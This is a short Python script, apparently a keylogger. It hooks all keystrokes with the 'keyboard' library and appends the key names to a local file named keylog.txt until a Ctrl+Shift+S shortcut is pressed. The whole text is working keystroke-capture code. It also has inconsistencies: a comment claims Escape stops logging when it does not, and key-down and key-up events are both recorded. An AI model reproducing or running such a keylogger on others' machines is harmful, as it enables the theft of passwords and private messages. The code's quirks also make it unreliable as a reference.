import keyboard
import time
import os
import sys

log_file = "keylog.txt"
log = []

# Function to log keystrokes
def log_key(key):
    if key.name == "esc":  # Escape key to stop logging
        return False
    log.append(key.name)
    if len(log) >= 10:  # Optional: Save every 10 keys
        save_log()
        log.clear()
    return True

# Function to save log to file
def save_log():
    with open(log_file, "a") as f:
        f.write("".join(log) + "\n")
    log.clear()

# Listen for keystrokes
keyboard.hook(log_key)

# Keep running the program in the background
print("Logging started. Press Ctrl + Shift + S to stop.")
keyboard.wait("ctrl+shift+s")  # Wait for Ctrl+Shift+S to stop
save_log()
print("Logging stopped.")
sys.exit()  # Exit the program
